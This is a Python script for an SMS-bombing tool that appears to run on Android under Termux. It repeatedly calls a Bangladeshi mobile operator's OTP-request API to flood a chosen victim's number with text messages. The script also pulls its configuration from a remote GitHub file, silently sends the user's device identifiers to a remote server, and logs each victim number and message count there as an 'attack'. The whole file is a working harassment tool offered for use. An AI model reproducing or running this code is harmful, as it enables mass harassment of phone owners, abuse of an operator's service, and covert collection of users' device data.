#Circle Pin All Device
import os,requests,time,sys,subprocess,json
from requests.structures import CaseInsensitiveDict
from all_file import api
from all_file import banner
from all_file import char as x
from all_file import clear
from all_file import colors
from all_file import randomColor as r
from all_file import device as oparetingSystem
version = "2.1.8"
url = "https://singleapp.robi.com.bd/api/v1/tokens/create_opt"
headers = CaseInsensitiveDict()
headers["Platform"] = "android"
headers["Appname"] = "robi"
headers["Deviceid"] = "1117297acfc89586"
headers["Appversion"] = "5.4.3"
headers["Locale"] = "en"
headers["Content-Type"] = "application/x-www-form-urlencoded"

def run():
	try:
		toolsInfo = requests.get("https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/bomber.json").json()
		cpu_id = str(subprocess.check_output("getprop ro.boot.cpuid",shell=True).decode()).replace("\n","")
		device_brand = subprocess.check_output("getprop ro.product.brand",shell=True).decode().replace("\n","")
		device_model = subprocess.check_output("getprop ro.product.model",shell=True).decode().replace("\n","")
		urlUser = toolsInfo["url"]+"/termux/device-create"
		headers = {
  'Content-Type': 'application/json'
}
		data = json.dumps({
  "cpu_id": cpu_id,
  "device_model": device_model,
  "device_brand": device_brand
})
		userStatus = requests.request("POST", urlUser, headers=headers, data=data).json()
		if userStatus["deviceStatus"] == "active":
			banner.home.bannerPrint(version)
			while True:
				phone = str(input(f"{colors.color.greenBold}    Enter Targert Phone Number {colors.color.cyanBold}[+88]: {colors.color.end}"))
				if len(phone) != 11:
					x.printf.char(colors.color.redBold+"    Please Enter 11Digit Number.",0.01)
				elif phone[:3] != "018":
					x.printf.char(colors.color.redBold+"    Please Enter a Robi number..",0.01)
				elif len(phone) == 11:
					break
			while True:
				amount = int(input(f"{colors.color.greenBold}    Enter SMS Amount [{toolsInfo['smsLimit']}] {colors.color.cyanBold}: {colors.color.end}"))
				if amount <= int(toolsInfo['smsLimit']):
					break
				else:
					x.printf.char(colors.color.redBold+"    Invalid amount..",0.01)
			if toolsInfo["dailyLimit"] == "enabled":
				urlLimit = url + "limit"
				#limit api use and Complete more Task
			else:
				sentOtp(phone,amount,toolsInfo)
		else:
			x.printf.char("    "+colors.color.redBold + userStatus['message'],0.01)				
	except requests.exceptions.ConnectionError:
		print("No internet")
		
def sentOtp(phone,amount,toolsInfo):
	print(f"    {colors.color.greenBold}Total SMS Sent: {colors.color.cyanBold}",end="")
	i=0
	while i < amount:
		data = "msisdn=88"+phone
		try:
			resp = requests.post(url, headers=headers, data=data)
			if resp.status_code==201:
				i+=1
				print_text = "[" + str(i) + "]"
				sys.stdout.write(print_text)
				sys.stdout.flush()
				sys.stdout.write("\b" * len(print_text))
		except requests.exceptions.ConnectionError:
			print("No internet")
	
	urlS = toolsInfo["url"] +"/termux/storeBombingData"
	cpu_id = str(subprocess.check_output("getprop ro.boot.cpuid",shell=True).decode()).replace("\n","")
	device_brand = subprocess.check_output("getprop ro.product.brand",shell=True).decode().replace("\n","")
	device_model = subprocess.check_output("getprop ro.product.model",shell=True).decode().replace("\n","")
	headersS = {
  'Content-Type': 'application/json'
}
	dataS = json.dumps({
  "cpu_id": cpu_id,
  "device_model": device_model,
  "device_brand": device_brand,
  "name":"Not Found",
  "number‎":"Not Found",
  "victim":phone,
  "amount": amount,
  "method": "robi 32bit attack."
})
	userStatus = requests.request("POST", urlS, headers=headersS, data=dataS).json()
	print("["+str(amount)+"]")